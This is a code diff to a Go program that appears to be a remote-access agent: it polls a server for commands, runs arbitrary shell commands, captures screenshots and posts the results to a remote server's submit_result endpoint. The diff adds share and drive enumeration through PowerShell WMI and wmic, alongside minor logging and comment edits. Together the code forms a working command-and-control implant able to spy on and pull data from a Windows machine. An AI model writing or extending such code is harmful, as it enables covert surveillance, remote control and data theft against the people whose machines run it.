@@ -37,7 +37,7 @@ type CommandResult struct {
 }
 
 func main() {
-    fmt.Println("Agent started. Waiting for commands...")
+    log.Println("Agent started. Waiting for commands...")
     ticker := time.NewTicker(10 * time.Second)
 
     go func() {
@@ -63,7 +63,7 @@ func main() {
         }
     }()
 
-    select {} // This line prevents the application from exiting immediately.
+    select {} // Prevent the application from exiting immediately.
 }
 
 func fetchCommand() (Command, error) {
@@ -89,6 +89,7 @@ func sendResult(result CommandResult) {
         log.Printf("Error marshalling result: %v", err)
         return
     }
+
     _, err = http.Post(fmt.Sprintf("%s/submit_result", serverURL), "application/json", bytes.NewBuffer(jsonData))
     if err != nil {
         log.Printf("Failed to send result: %v", err)
@@ -109,6 +110,10 @@ func executeCommandAndSendResult(cmd Command) {
         }
     case cmd.Cmd == "screenshot":
         takeScreenshot(cmd)
+    case cmd.Cmd == "list_share":
+        listShare(cmd)
+    case cmd.Cmd == "list_drive":
+        listDrive(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -166,15 +171,38 @@ func takeScreenshot(cmd Command) {
         log.Printf("Failed to encode screenshot to PNG: %v", err)
         return
     }
-
-    // Use the current date and time to format the filename
-    timestamp := time.Now().Format("20060102-150405") // YYYYMMDD-HHMMSS format
+    timestamp := time.Now().Format("20060102-150405")
     fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
-
     sendResult(CommandResult{
         ID:       cmd.ID,
         Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
         FileName: fileName,
+    })
+}
+
+func listShare(cmd Command) {
+    psCommand := "powershell.exe Get-WmiObject Win32_Share"
+    output, err := exec.Command("cmd", "/C", psCommand).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
+    })
+}
+
+func listDrive(cmd Command) {
+    wmicCommand := "wmic logicaldisk get name,size"
+    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
+    resultText := string(output)
+    if err != nil {
+        resultText += "\nError: " + err.Error()
+    }
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: resultText,
     })
 }
 
